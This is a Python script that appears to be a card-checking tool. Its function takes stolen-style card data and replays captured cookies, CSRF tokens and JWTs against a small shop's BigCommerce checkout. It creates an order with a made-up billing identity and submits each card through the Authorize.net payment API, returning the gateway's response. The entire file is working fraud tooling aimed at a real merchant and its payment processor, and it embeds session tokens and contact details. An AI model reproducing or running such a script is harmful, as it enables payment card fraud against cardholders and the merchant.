import requests
import user_agent
import time
def Tele(ccx):
		ccx=ccx.strip()
		n = ccx.split("|")[0]
		mm = ccx.split("|")[1]
		yy = ccx.split("|")[2]
		cvc = ccx.split("|")[3]
		user = str(user_agent.generate_user_agent)
				
		cookies = {
		    'fornax_anonymousId': '41f9f889-e519-41b6-bfed-f138765e59e6',
		    'ajs_user_id': 'null',
		    'ajs_group_id': 'null',
		    'ajs_anonymous_id': '%2258ad0ddb-ffdc-4004-a6d2-a53a12b4aab3%22',
		    '_gcl_au': '1.1.1400795166.1713139528',
		    '_fbp': 'fb.1.1713139527980.1549420535',
		    'cf_clearance': 'PVvlZukMlJ0LdE6esP9f9nauv9m8AH7M1nWPniFOmRY-1718390716-1.0.1.1-YUIANSlYw9in7Isxa6uj4hk6TJkCxb0379JjKuMMHUp4.r.GYtq.tBdPW.iL5PP2xRRRGuvc7ywU2Cc1n_3NNA',
		    'athena_short_visit_id': '8dfb80c4-5aad-4860-82db-930fc3410763:1718742792',
		    'XSRF-TOKEN': '8d4cbc9f52d11499e6522b3866ac0416b70dee7e0daee8fc4d1457665ec2924c',
		    'SHOP_SESSION_TOKEN': 'lut32gepbp1rg7qumo3ntge7ie',
		    '__cf_bm': 'qKA.xJ7gT4CgAGx45jFbc.Jvc.9wYmL1Rif0xIEgRE8-1718742793-1.0.1.1-RNNQ_wcpPMeKWzAWE6YjnqCXOX1KKZqm4m2vBx2K.96yCkYBYb5XTljdLhEyGovpt6KXepNdgdSjRaQGpNsXMw',
		    'STORE_VISITOR': '1',
		    '_gid': 'GA1.2.1551042481.1718742796',
		    'soundestID': '20240618203316-kBlIPcTpJF4eoKeOW5Sqhq2cfR7iFLEg7zLxndE59mpNGilqN',
		    'omnisendSessionID': 'ikPOXRjoruw8Bi-20240618203316',
		    'SF-CSRF-TOKEN': '79aae26a-feab-4b69-b2db-99ea5bae6551',
		    'lastVisitedCategory': '31',
		    'vs_timer_control': '10',
		    'SHOP_SESSION_ROTATION_TOKEN': 'cc635160362201197dd2692ad0d486616265939858469ff348f50ab211d0ebf1',
		    '_ga': 'GA1.1.1393698890.1713139528',
		    '_ga_EW1F117GXX': 'GS1.1.1718742807.11.1.1718742932.0.0.0',
		    'Shopper-Pref': '485AD93E58C50805870BF81890777B95DE4CDBF6-1719347739403-x%7B%22cur%22%3A%22USD%22%7D',
		}
		
		headers = {
		    'authority': 'www.tailbangers.com',
		    'accept': 'application/vnd.bc.v1+json',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'referer': 'https://www.tailbangers.com/checkout',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-arch': '"x86"',
		    'sec-ch-ua-bitness': '"64"',
		    'sec-ch-ua-full-version': '"120.0.6099.116"',
		    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-model': '""',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-ch-ua-platform-version': '""',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
		    'x-checkout-sdk-version': '1.620.0',
		    'x-sf-csrf-token': '79aae26a-feab-4b69-b2db-99ea5bae6551',
		    'x-xsrf-token': '8d4cbc9f52d11499e6522b3866ac0416b70dee7e0daee8fc4d1457665ec2924c',
		}
		
		params = {
		    'include': 'cart.lineItems.physicalItems.options,cart.lineItems.digitalItems.options,customer,customer.customerGroup,payments,promotions.banners',
		}
		
		response = requests.get(
		    'https://www.tailbangers.com/api/storefront/checkout/36a4372d-1f7c-493d-9c43-2eb2530a03d5',
		    params=params,
		    cookies=cookies,
		    headers=headers,
		)
		
		card = (response.json()['cart']['id'])
				
		cookies = {
		    'fornax_anonymousId': '41f9f889-e519-41b6-bfed-f138765e59e6',
		    'ajs_user_id': 'null',
		    'ajs_group_id': 'null',
		    'ajs_anonymous_id': '%2258ad0ddb-ffdc-4004-a6d2-a53a12b4aab3%22',
		    '_gcl_au': '1.1.1400795166.1713139528',
		    '_fbp': 'fb.1.1713139527980.1549420535',
		    'cf_clearance': 'PVvlZukMlJ0LdE6esP9f9nauv9m8AH7M1nWPniFOmRY-1718390716-1.0.1.1-YUIANSlYw9in7Isxa6uj4hk6TJkCxb0379JjKuMMHUp4.r.GYtq.tBdPW.iL5PP2xRRRGuvc7ywU2Cc1n_3NNA',
		    'athena_short_visit_id': '8dfb80c4-5aad-4860-82db-930fc3410763:1718742792',
		    'XSRF-TOKEN': '8d4cbc9f52d11499e6522b3866ac0416b70dee7e0daee8fc4d1457665ec2924c',
		    'SHOP_SESSION_TOKEN': 'lut32gepbp1rg7qumo3ntge7ie',
		    '__cf_bm': 'qKA.xJ7gT4CgAGx45jFbc.Jvc.9wYmL1Rif0xIEgRE8-1718742793-1.0.1.1-RNNQ_wcpPMeKWzAWE6YjnqCXOX1KKZqm4m2vBx2K.96yCkYBYb5XTljdLhEyGovpt6KXepNdgdSjRaQGpNsXMw',
		    'STORE_VISITOR': '1',
		    '_gid': 'GA1.2.1551042481.1718742796',
		    'soundestID': '20240618203316-kBlIPcTpJF4eoKeOW5Sqhq2cfR7iFLEg7zLxndE59mpNGilqN',
		    'omnisendSessionID': 'ikPOXRjoruw8Bi-20240618203316',
		    'SF-CSRF-TOKEN': '79aae26a-feab-4b69-b2db-99ea5bae6551',
		    'lastVisitedCategory': '31',
		    'vs_timer_control': '10',
		    'SHOP_SESSION_ROTATION_TOKEN': 'cc635160362201197dd2692ad0d486616265939858469ff348f50ab211d0ebf1',
		    '_ga': 'GA1.1.1393698890.1713139528',
		    '_ga_EW1F117GXX': 'GS1.1.1718742807.11.1.1718742932.0.0.0',
		    'Shopper-Pref': '1E624657EF107914663EF1FA9C06C0B3B58EB7E1-1719347814409-x%7B%22cur%22%3A%22USD%22%7D',
		}
		
		headers = {
		    'authority': 'www.tailbangers.com',
		    'accept': 'application/json, text/plain, */*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/json',
		    # 'cookie': 'fornax_anonymousId=41f9f889-e519-41b6-bfed-f138765e59e6; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2258ad0ddb-ffdc-4004-a6d2-a53a12b4aab3%22; _gcl_au=1.1.1400795166.1713139528; _fbp=fb.1.1713139527980.1549420535; cf_clearance=PVvlZukMlJ0LdE6esP9f9nauv9m8AH7M1nWPniFOmRY-1718390716-1.0.1.1-YUIANSlYw9in7Isxa6uj4hk6TJkCxb0379JjKuMMHUp4.r.GYtq.tBdPW.iL5PP2xRRRGuvc7ywU2Cc1n_3NNA; athena_short_visit_id=8dfb80c4-5aad-4860-82db-930fc3410763:1718742792; XSRF-TOKEN=8d4cbc9f52d11499e6522b3866ac0416b70dee7e0daee8fc4d1457665ec2924c; SHOP_SESSION_TOKEN=lut32gepbp1rg7qumo3ntge7ie; __cf_bm=qKA.xJ7gT4CgAGx45jFbc.Jvc.9wYmL1Rif0xIEgRE8-1718742793-1.0.1.1-RNNQ_wcpPMeKWzAWE6YjnqCXOX1KKZqm4m2vBx2K.96yCkYBYb5XTljdLhEyGovpt6KXepNdgdSjRaQGpNsXMw; STORE_VISITOR=1; _gid=GA1.2.1551042481.1718742796; soundestID=20240618203316-kBlIPcTpJF4eoKeOW5Sqhq2cfR7iFLEg7zLxndE59mpNGilqN; omnisendSessionID=ikPOXRjoruw8Bi-20240618203316; SF-CSRF-TOKEN=79aae26a-feab-4b69-b2db-99ea5bae6551; lastVisitedCategory=31; vs_timer_control=10; SHOP_SESSION_ROTATION_TOKEN=cc635160362201197dd2692ad0d486616265939858469ff348f50ab211d0ebf1; _ga=GA1.1.1393698890.1713139528; _ga_EW1F117GXX=GS1.1.1718742807.11.1.1718742932.0.0.0; Shopper-Pref=1E624657EF107914663EF1FA9C06C0B3B58EB7E1-1719347814409-x%7B%22cur%22%3A%22USD%22%7D',
		    'origin': 'https://www.tailbangers.com',
		    'referer': 'https://www.tailbangers.com/checkout',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-arch': '"x86"',
		    'sec-ch-ua-bitness': '"64"',
		    'sec-ch-ua-full-version': '"120.0.6099.116"',
		    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-model': '""',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-ch-ua-platform-version': '""',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
		    'x-checkout-sdk-version': '1.620.0',
		    'x-checkout-variant': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3d3dy50YWlsYmFuZ2Vycy5jb20iLCJpYXQiOjE3MTg3NDI4ODcsImRvbWFpbiI6eyJjYXJ0SWQiOiIzNmE0MzcyZC0xZjdjLTQ5M2QtOWM0My0yZWIyNTMwYTAzZDUiLCJjaGVja291dFZhcmlhbnQiOiJvcHRpbWl6ZWRfb25lX3BhZ2VfY2hlY2tvdXQifX0.-b-2pqcaBvMtXfr0eCc8lLtkr8ls0_wGB-nSJwc4BS8',
		    'x-sf-csrf-token': '79aae26a-feab-4b69-b2db-99ea5bae6551',
		    'x-xsrf-token': '8d4cbc9f52d11499e6522b3866ac0416b70dee7e0daee8fc4d1457665ec2924c',
		}
		
		json_data = {
		    'cartId': '7655',
		    'customerMessage': '',
		}
		
		response = requests.post(
		    'https://www.tailbangers.com/internalapi/v1/checkout/order',
		    cookies=cookies,
		    headers=headers,
		    json=json_data,
		)
		
			
		cookies = {
		    'fornax_anonymousId': '41f9f889-e519-41b6-bfed-f138765e59e6',
		    'ajs_user_id': 'null',
		    'ajs_group_id': 'null',
		    'ajs_anonymous_id': '%2258ad0ddb-ffdc-4004-a6d2-a53a12b4aab3%22',
		    '_gcl_au': '1.1.1400795166.1713139528',
		    '_fbp': 'fb.1.1713139527980.1549420535',
		    'cf_clearance': 'PVvlZukMlJ0LdE6esP9f9nauv9m8AH7M1nWPniFOmRY-1718390716-1.0.1.1-YUIANSlYw9in7Isxa6uj4hk6TJkCxb0379JjKuMMHUp4.r.GYtq.tBdPW.iL5PP2xRRRGuvc7ywU2Cc1n_3NNA',
		    'athena_short_visit_id': '8dfb80c4-5aad-4860-82db-930fc3410763:1718742792',
		    'XSRF-TOKEN': '8d4cbc9f52d11499e6522b3866ac0416b70dee7e0daee8fc4d1457665ec2924c',
		    'SHOP_SESSION_TOKEN': 'lut32gepbp1rg7qumo3ntge7ie',
		    '__cf_bm': 'qKA.xJ7gT4CgAGx45jFbc.Jvc.9wYmL1Rif0xIEgRE8-1718742793-1.0.1.1-RNNQ_wcpPMeKWzAWE6YjnqCXOX1KKZqm4m2vBx2K.96yCkYBYb5XTljdLhEyGovpt6KXepNdgdSjRaQGpNsXMw',
		    'STORE_VISITOR': '1',
		    '_gid': 'GA1.2.1551042481.1718742796',
		    'soundestID': '20240618203316-kBlIPcTpJF4eoKeOW5Sqhq2cfR7iFLEg7zLxndE59mpNGilqN',
		    'omnisendSessionID': 'ikPOXRjoruw8Bi-20240618203316',
		    'SF-CSRF-TOKEN': '79aae26a-feab-4b69-b2db-99ea5bae6551',
		    'lastVisitedCategory': '31',
		    'vs_timer_control': '10',
		    'SHOP_SESSION_ROTATION_TOKEN': 'cc635160362201197dd2692ad0d486616265939858469ff348f50ab211d0ebf1',
		    '_ga': 'GA1.1.1393698890.1713139528',
		    '_ga_EW1F117GXX': 'GS1.1.1718742807.11.1.1718742932.0.0.0',
		    'Shopper-Pref': 'CBEB696253CD819B5CBDFF3C376FE281E5CCB314-1719347818187-x%7B%22cur%22%3A%22USD%22%7D',
		}
		
		headers = {
		    'authority': 'www.tailbangers.com',
		    'accept': 'application/vnd.bc.v1+json',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    # 'cookie': 'fornax_anonymousId=41f9f889-e519-41b6-bfed-f138765e59e6; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2258ad0ddb-ffdc-4004-a6d2-a53a12b4aab3%22; _gcl_au=1.1.1400795166.1713139528; _fbp=fb.1.1713139527980.1549420535; cf_clearance=PVvlZukMlJ0LdE6esP9f9nauv9m8AH7M1nWPniFOmRY-1718390716-1.0.1.1-YUIANSlYw9in7Isxa6uj4hk6TJkCxb0379JjKuMMHUp4.r.GYtq.tBdPW.iL5PP2xRRRGuvc7ywU2Cc1n_3NNA; athena_short_visit_id=8dfb80c4-5aad-4860-82db-930fc3410763:1718742792; XSRF-TOKEN=8d4cbc9f52d11499e6522b3866ac0416b70dee7e0daee8fc4d1457665ec2924c; SHOP_SESSION_TOKEN=lut32gepbp1rg7qumo3ntge7ie; __cf_bm=qKA.xJ7gT4CgAGx45jFbc.Jvc.9wYmL1Rif0xIEgRE8-1718742793-1.0.1.1-RNNQ_wcpPMeKWzAWE6YjnqCXOX1KKZqm4m2vBx2K.96yCkYBYb5XTljdLhEyGovpt6KXepNdgdSjRaQGpNsXMw; STORE_VISITOR=1; _gid=GA1.2.1551042481.1718742796; soundestID=20240618203316-kBlIPcTpJF4eoKeOW5Sqhq2cfR7iFLEg7zLxndE59mpNGilqN; omnisendSessionID=ikPOXRjoruw8Bi-20240618203316; SF-CSRF-TOKEN=79aae26a-feab-4b69-b2db-99ea5bae6551; lastVisitedCategory=31; vs_timer_control=10; SHOP_SESSION_ROTATION_TOKEN=cc635160362201197dd2692ad0d486616265939858469ff348f50ab211d0ebf1; _ga=GA1.1.1393698890.1713139528; _ga_EW1F117GXX=GS1.1.1718742807.11.1.1718742932.0.0.0; Shopper-Pref=CBEB696253CD819B5CBDFF3C376FE281E5CCB314-1719347818187-x%7B%22cur%22%3A%22USD%22%7D',
		    'referer': 'https://www.tailbangers.com/checkout',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-arch': '"x86"',
		    'sec-ch-ua-bitness': '"64"',
		    'sec-ch-ua-full-version': '"120.0.6099.116"',
		    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-model': '""',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-ch-ua-platform-version': '""',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
		    'x-checkout-sdk-version': '1.620.0',
		    'x-sf-csrf-token': '79aae26a-feab-4b69-b2db-99ea5bae6551',
		    'x-xsrf-token': '8d4cbc9f52d11499e6522b3866ac0416b70dee7e0daee8fc4d1457665ec2924c',
		}
		
		params = {
		    'include': 'payments,lineItems.physicalItems.socialMedia,lineItems.physicalItems.options,lineItems.physicalItems.categories,lineItems.digitalItems.socialMedia,lineItems.digitalItems.options,lineItems.digitalItems.categories',
		}
		
		response = requests.get('https://www.tailbangers.com/api/storefront/orders/6570', params=params, cookies=cookies, headers=headers)
		
		time.sleep(5)
				
		headers = {
		    'Accept': 'application/json',
		    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'Authorization': 'JWT eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MTg3NDY2MTcsIm5iZiI6MTcxODc0MzAxNywiaXNzIjoicGF5bWVudHMuYmlnY29tbWVyY2UuY29tIiwic3ViIjoxMDAwNzUzNzA1LCJqdGkiOiI0MjJiYzM4MS0zZjE5LTRkN2QtYjU5Ni1iOWM0YTVlNWYwMDYiLCJpYXQiOjE3MTg3NDMwMTcsImRhdGEiOnsic3RvcmVfaWQiOiIxMDAwNzUzNzA1Iiwib3JkZXJfaWQiOiI2NTcwIiwiYW1vdW50IjoyNDk5LCJjdXJyZW5jeSI6IlVTRCIsInN0b3JlX3VybCI6Imh0dHBzOi8vd3d3LnRhaWxiYW5nZXJzLmNvbSIsImZvcm1faWQiOiJmMzliOWQ3Yi0zMWQwLTQ2ZTMtOTUwNC00YTU1ZDk3MDYwNTUifX0.f2W1EETFGElylWkDlqfwaFMsf_4TlYhr7sQkGXuw31s',
		    'Connection': 'keep-alive',
		    'Content-Type': 'application/json',
		    'Origin': 'https://payments.bigcommerce.com',
		    'Referer': 'https://payments.bigcommerce.com/pay/hosted_forms/f39b9d7b-31d0-46e3-9504-4a55d9706055/field?version=1.620.0',
		    'Sec-Fetch-Dest': 'empty',
		    'Sec-Fetch-Mode': 'cors',
		    'Sec-Fetch-Site': 'same-origin',
		    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		}
		
		json_data = {
		    'customer': {
		        'geo_ip_country_code': 'EG',
		        'session_token': '994767e26616141e9c9c8f3f268a5a42102f2a25',
		    },
		    'notify_url': 'https://internalapi-1000753705.mybigcommerce.com/internalapi/v1/checkout/order/6570/payment',
		    'order': {
		        'billing_address': {
		            'city': 'New YURK',
		            'country_code': 'US',
		            'country': 'United States',
		            'first_name': 'Angel',
		            'last_name': 'Rippin',
		            'phone': '16462965794',
		            'state_code': 'NY',
		            'state': 'New York',
		            'street_1': 'New YURK',
		            'zip': '10001',
		            'email': 'gvvvv7277@gmail.com',
		        },
		        'coupons': [],
		        'currency': 'USD',
		        'id': '6570',
		        'items': [
		            {
		                'code': 'e3372e29-3e9d-44cd-9c24-0837ec5476d7',
		                'variant_id': 82,
		                'name': 'Happy Birthday Caddy & Birthday Bundt Cake',
		                'price': 2499,
		                'unit_price': 2499,
		                'quantity': 1,
		                'sku': 'HDS201626',
		            },
		        ],
		        'shipping': [
		            {
		                'method': 'Pickup In Delaware (Tail Bangers, 24546 Betts Pond Rd, Millboro, DE 19966)',
		            },
		        ],
		        'shipping_address': {
		            'city': 'New YURK',
		            'country_code': 'US',
		            'country': 'United States',
		            'first_name': 'Angel',
		            'last_name': 'Rippin',
		            'phone': '16462965794',
		            'state_code': 'NY',
		            'state': 'New York',
		            'street_1': 'New YURK',
		            'zip': '10001',
		        },
		        'token': 'aaa65c99cbd7af7c97e548697c75b9d0',
		        'totals': {
		            'grand_total': 2499,
		            'handling': 0,
		            'shipping': 0,
		            'subtotal': 2499,
		            'tax': 0,
		        },
		    },
		    'payment': {
		        'gateway': 'authorizenet',
		        'notify_url': 'https://internalapi-1000753705.mybigcommerce.com/internalapi/v1/checkout/order/6570/payment',
		        'vault_payment_instrument': False,
		        'method': 'credit-card',
		        'credit_card': {
		            'account_name': 'angel nanse',
		            'month': 7,
		            'number': n,
		            'verification_value': cvc,
		            'year': yy,
		            'hosted_form_nonce': '5fe4bf95f1149d0a8bc1b23d0d8d7717a5df4c4e2652b23b6377cd874386d7bc',
		        },
		    },
		    'store': {
		        'hash': 'gl5xihpq57',
		        'id': '1000753705',
		        'name': 'Tail Bangers Inc.',
		    },
		}
		
		response = requests.post('https://payments.bigcommerce.com/api/public/v1/orders/payments', headers=headers, json=json_data)

		time.sleep(5)
		try:
			ii=(response.text)
		except:
			return 'error'
		return ii
	
